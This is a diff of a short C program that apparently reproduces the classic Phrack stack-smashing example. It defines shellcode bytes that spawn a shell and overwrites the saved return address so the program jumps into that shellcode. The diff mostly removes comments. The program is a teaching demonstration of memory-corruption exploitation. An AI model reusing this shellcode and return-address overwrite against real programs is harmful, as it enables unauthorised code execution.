@@ -1,5 +1,3 @@
-/*this file is copied from phrack magazine*/
-/*shellcode*/
 char shellcode[] =
 	"\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
 	"\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
@@ -10,7 +8,6 @@ void call_(void);
 void function(int a, int b, int c) {
    char buffer1[6];
    int *ret;
-
    ret = buffer1 + 14;
    //(*ret) = 7;
    *ret = (int)shellcode;
@@ -22,7 +19,7 @@ void main() {
   x = 0;
   function(1,2,3);
   x = 1;
-  call_();
+  //call_();
   printf("%d\n",x);
 }
 
@@ -30,7 +27,6 @@ void call_(void){
 printf("bye bye \n");
 }
 
-//initial code
 #if 0
 char shellcode[] =
 	"\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
